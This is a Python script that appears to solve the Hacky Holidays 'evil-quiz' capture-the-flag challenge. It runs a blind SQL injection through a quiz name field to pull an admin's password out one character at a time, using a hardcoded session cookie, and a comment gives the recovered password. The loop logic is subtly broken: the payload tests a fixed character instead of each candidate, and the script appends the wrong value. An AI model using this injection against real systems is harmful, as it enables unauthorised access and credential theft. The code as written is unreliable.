#!/usr/bin/env python3
from requests.sessions import Session
import re
import string


url = f'https://hackyholidays.h1ctf.com/evil-quiz'
url2 = f'https://hackyholidays.h1ctf.com/evil-quiz/score'
cookies = {'session' : '8bca7e0290021ebe5a773afd98f6db1c'}

# table_names = [
    # 'user',
    # 'users',
    # 'usernames',
    # 'admin',
    # 'admins',
    # 'adminstrator',
    # 'administrators',
    # 'username',
    # 'name',
    # 'names',
    # 'presents',
# ]

chrs = string.printable
pass_l = 17 # Password Length
password = ""
for idx in range(pass_l):
    for i in chrs:
        print(f"trying : {i}")
        payload = f"sdf'OR (SELECT 1 from admin where username='grinch' AND BINARY substring(Password, {idx}, 1)='w' )-- "
        # payload = f"sdf'OR (SELECT 1 from admin where username='admin' AND (strcmp(substr(Password,{idx},1),'s')))-- "
        p_obj = {'name' : f'{payload}'}
        s = Session()
        response1 = s.post(url, cookies=cookies, data=p_obj)
        response2 =  s.get(url2, cookies=cookies)
        content = response2.text
        matched = re.findall("There is ([0-9]+) .*div>", content)
        if(matched[0] != '0'):
            print("************Found**************")
            print(f"Character at index {idx} is : {i}")
            password += chrs
            exit(0)
        # print(matched[0])
        # print("Not FOund!")

# password: S3creT_p4ssw0rd_$

